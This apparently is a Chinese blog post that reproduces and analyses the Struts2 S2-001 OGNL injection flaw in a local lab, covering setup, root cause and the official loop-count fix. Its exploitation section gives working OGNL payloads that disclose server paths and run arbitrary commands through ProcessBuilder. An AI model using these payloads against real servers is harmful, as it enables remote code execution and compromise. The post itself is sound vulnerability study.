---
title: 从零开始学习struts2 S2-001
date: 2018-08-30 11:20:16
tags:
	- java
	- struts2
	- 漏洞分析
---

# 前言

由于之前面向对象语言学习的是C++，而且java还是有着蛮多的语言规范，导致看不怎么懂java，从而java安全这块的内容一直没怎么涉及。

后来之前蛮火的S2-057，自己也就没怎么能去参与。于是想着，趁着暑假这最后还有一两个星期的时间，入门学习一下java安全。想着即使在这块没有什么研究，但能做到看得懂，会利用把。

于是挑了看起来最简单的S2-001来尝试复现，由于在java web这块完全没有什么基础，导致踩了很多坑，很多也是环境、搭建上面的问题，最后总算还是艰难的完成了复现，遂记录一下。



# 环境搭建

平台：win10

工具：

 - Apache Tomcat 9.0.7
 - IntelliJ IDEA

首先在IDEA中新建一个project

![](从零开始学习struts2-S2-001\1.png)

创建好后源码代码结构如下

![](从零开始学习struts2-S2-001\2.png)

接下来依此来搭建环境

![](从零开始学习struts2-S2-001\3.png)

首先先从http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip中下载struts2的jar包

然后将在`WEB-INF`目录中新建lib目录，将所需的五个包放入

然后修改web.xml内容为

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://xmlns.jcp.org/xml/ns/javaee" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" id="WebApp_ID" version="3.1">
    <display-name>S2-001 Example</display-name>
    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.FilterDispatcher</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <welcome-file-list>
        <welcome-file>index.jsp</welcome-file>
    </welcome-file-list>
</web-app>
```

新建index.jsp和welcome.jsp内容如下

index.jsp

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>S2-001</title>
</head>
<body>
<h2>S2-001 Demo</h2>
<p>link: <a href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<s:form action="login">
  <s:textfield name="username" label="username" />
  <s:textfield name="password" label="password" />
  <s:submit></s:submit>
</s:form>
</body>
</html>
```

welcome.jsp

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>S2-001</title>
</head>
<body>
<p>Hello <s:property value="username"></s:property></p>
</body>
</html>
```

然后在src中新建`com.demo.action`package

这时候src会突然找不到，只要点击一下上面的Project Files就能看到文件

![](从零开始学习struts2-S2-001\4.png)

然后新建一个`LoginAction.java`，内容如下

```java
package com.demo.action;

import com.opensymphony.xwork2.ActionSupport;

public class LoginAction extends ActionSupport {
    private String username = null;
    private String password = null;

    public String getUsername() {
        return this.username;
    }

    public String getPassword() {
        return this.password;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public String execute() throws Exception {
        if ((this.username.isEmpty()) || (this.password.isEmpty())) {
            return "error";
        }
        if ((this.username.equalsIgnoreCase("admin"))
                && (this.password.equals("admin"))) {
            return "success";
        }
        return "error";
    }
}
```

然后在src目录下新建struts.xml，内容如下

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd">
<struts>
    <package name="S2-001" extends="struts-default">
        <action name="login" class="com.demo.action.LoginAction">
            <result name="success">welcome.jsp</result>
            <result name="error">index.jsp</result>
        </action>
    </package>
</struts>
```

这时候会看到LoginAction会一直显示找不到要导入的`opensymphony.xwork2.ActionSupport`，是由于jar包还没有真正的被导入到这个项目中

点击`File->Project Structure`

![](从零开始学习struts2-S2-001\5.png)

然后找到刚才在lib目录下的jar包，点上勾之后点击OK即可

然后`Build->Build Project`build一下整个项目，刚才的包就被成功的导入到项目中，错误提示也就消失了

然后配置一下tomcat的debug configurations，就可以成功运行这个项目了

![](从零开始学习struts2-S2-001\6.png)

点击运行后，访问8888端口即可（默认为8080，我这更改了下），看到如下页面就表示环境搭建成功

![](从零开始学习struts2-S2-001\7.png)



# 漏洞利用

在登录失败的时候可以看到，会将错误的`username`和`password`显示在输入框中

![](从零开始学习struts2-S2-001\8.png)

然而当我们在密码框处输入这样一个字符串时`%{1+1}`（`%`需编码）会被解析成2

![](从零开始学习struts2-S2-001\9.png)

从而利用这一特性，可以构造一些命令执行语句

获取tomcat路径

```
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```

![](从零开始学习struts2-S2-001\10.png)



获取web路径

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```

![](从零开始学习struts2-S2-001\11.png)



以及命令执行

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

![](从零开始学习struts2-S2-001\12.png)

将其中的`java.lang.String[]{"whoami"}`修改一下就可以执行任意命令



# OGNL表达式

搬运

> OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 三要素：(以下部分摘抄互联网某处, 我觉得说得好)
>
> 1、表达式（Expression）
>
> 表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL 操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者 department 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多。
>
> 2、根对象（Root Object）
>
> 根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user 就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department 中的 name 属性值）。
>
> 3、上下文环境（Context）
>
> 有了表达式和根对象，我们实际上已经可以使用 OGNL 的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL 的内部，所有的操作都会在一个特定的环境中运行，这个环境就是 OGNL 的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。
>  OGN L 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root
>  Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root
>  Object）的存取操作的表达式是不需要增加 #符号进行区分的。
>
> 表达式功能操作清单：
>
> ```
> 1. 基本对象树的访问
> 对象树的访问就是通过使用点号将对象的引用串联起来进行。
> 例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx
> 
> 2. 对容器变量的访问
> 对容器变量的访问，通过#符号加上表达式进行。
> 例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx
> 
> 3. 使用操作符号
> OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, in, not in等。
> 
> 4. 容器、数组、对象
> OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]
> 同时，OGNL支持对Map的按键值查找：
> 例如：#session['mySessionPropKey']
> 不仅如此，OGNL还支持容器的构造的表达式：
> 例如：{"green", "red", "blue"}构造一个List，#{"key1" : "value1", "key2" : "value2", "key3" : "value3"}构造一个Map
> 你也可以通过任意类对象的构造函数进行对象新建
> 例如：new Java.net.URL("xxxxxx/")
> 
> 5. 对静态方法或变量的访问
> 要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：
> 
> 6. 方法调用
> 直接通过类似Java的方法调用方式进行，你甚至可以传递参数：
> 例如：user.getName()，group.users.size()，group.containsUser(#requestUser)
> 
> 7. 投影和选择
> OGNL支持类似数据库中的投影（projection） 和选择（selection）。
> 投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.{XXX}，其中XXX 是这个集合中每个元素的公共属性。
> 例如：group.userList.{username}将获得某个group中的所有user的name的列表。
> 选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.{X YYY}，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：
> ? 选择满足条件的所有元素
> ^ 选择满足条件的第一个元素
> $ 选择满足条件的最后一个元素
> 例如：group.userList.{? #txxx.xxx != null}将获得某个group中user的name不为空的user的列表。
> ```

struts2中大量用到了这种OGNL表达式，正是由于有这种功能强大的表达式，只要当传入解析的表达式我们可以控制的时候，就可以触发漏洞。



# 漏洞分析

可以锁定到最终变量值发生变化的区域是在`xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class:30 line`中

```java
public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator) {
    Object result = expression;

    while(true) {
        int start = expression.indexOf(open + "{");
        int length = expression.length();
        int x = start + 2;
        int count = 1;

        while(start != -1 && x < length && count != 0) {
            char c = expression.charAt(x++);
            if (c == '{') {
                ++count;
            } else if (c == '}') {
                --count;
            }
        }

        int end = x - 1;
        if (start == -1 || end == -1 || count != 0) {
            return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
        }

        String var = expression.substring(start + 2, end);
        Object o = stack.findValue(var, asType);
        if (evaluator != null) {
            o = evaluator.evaluate(o);
        }

        String left = expression.substring(0, start);
        String right = expression.substring(end + 1);
        if (o != null) {
            if (TextUtils.stringSet(left)) {
                result = left + o;
            } else {
                result = o;
            }

            if (TextUtils.stringSet(right)) {
                result = result + right;
            }

            expression = left + o + right;
        } else {
            result = left + right;
            expression = left + right;
        }
    }
}
```

在此处下了断点之后，可以看到

依次进入了好几次，不同时候的`expression`的值都会有所不同，我们找到值为`password`时开始分析

![](从零开始学习struts2-S2-001\13.png)

经过两次如下代码之后，将其生成了OGNL表达式，返回了`%{password}`

```java
return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
```

然后这次的判断跳过了中间的return，来到后面，取出`%{password}`中间的值`password`赋给`var`

![](从零开始学习struts2-S2-001\15.png)

然后通过`Object o = stack.findValue(var, asType)`获得到password的值为`%{1+1}`

然后重新赋值给expression，进行下一次循环

![](从零开始学习struts2-S2-001\16.png)

在这一次循环的时候，就再次解析了`%{1+1}`这个OGNL表达式，并将其赋值给了`o`

![](从零开始学习struts2-S2-001\17.png)

最后`expression`的值就变成了2，不是OGNL表达式时就会进入

```java
return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
```

最后返回并显示在表单中



# 漏洞修复

通过之前的漏洞分析可以看到，由于struts2错误的使用了递归来进行验证，导致OGNL表达式的执行

官方给出的修复

```java
public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, int maxLoopCount) {
    // deal with the "pure" expressions first!
    //expression = expression.trim();
    Object result = expression;
    int loopCount = 1;
    int pos = 0;
    while (true) {
        
        int start = expression.indexOf(open + "{", pos);
        if (start == -1) {
            pos = 0;
            loopCount++;
            start = expression.indexOf(open + "{");
        }
        if (loopCount > maxLoopCount) {
            // translateVariables prevent infinite loop / expression recursive evaluation
            break;
        }
        int length = expression.length();
        int x = start + 2;
        int end;
        char c;
        int count = 1;
        while (start != -1 && x < length && count != 0) {
            c = expression.charAt(x++);
            if (c == '{') {
                count++;
            } else if (c == '}') {
                count--;
            }
        }
        end = x - 1;

        if ((start != -1) && (end != -1) && (count == 0)) {
            String var = expression.substring(start + 2, end);

            Object o = stack.findValue(var, asType);
            if (evaluator != null) {
            	o = evaluator.evaluate(o);
            }
            

            String left = expression.substring(0, start);
            String right = expression.substring(end + 1);
            String middle = null;
            if (o != null) {
                middle = o.toString();
                if (!TextUtils.stringSet(left)) {
                    result = o;
                } else {
                    result = left + middle;
                }

                if (TextUtils.stringSet(right)) {
                    result = result + right;
                }

                expression = left + middle + right;
            } else {
                // the variable doesn't exist, so don't display anything
                result = left + right;
                expression = left + right;
            }
            pos = (left != null && left.length() > 0 ? left.length() - 1: 0) +
                  (middle != null && middle.length() > 0 ? middle.length() - 1: 0) +
                  1;
            pos = Math.max(pos, 1);
        } else {
            break;
        }
    }

    return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
}
```

可以明显看到多了这样的判断

```java
if (loopCount > maxLoopCount) {
    // translateVariables prevent infinite loop / expression recursive evaluation
    break;
}
```

判断了循环的次数，从而在解析到`%{1+1}`的时候不会继续向下递归



# 总结

漏洞的形成确实不算是特别难，但是由于对于java的不熟悉，以及一些搭建配置的问题，导致还是花费了很多精力和时间去完成这个漏洞分析和复现的。正面刚java确实有点脑壳疼，暑假还剩下这几天，再多复现几个漏洞把。。





# Reference Links

https://chybeta.github.io/2018/02/06/【struts2-命令-代码执行漏洞分析系列】S2-001/

http://www.zerokeeper.com/vul-analysis/struts2-command-execution-series-review.html

https://www.codemonster.cn/2018/03/28/2018-struts2-001/

https://github.com/vulhub/vulhub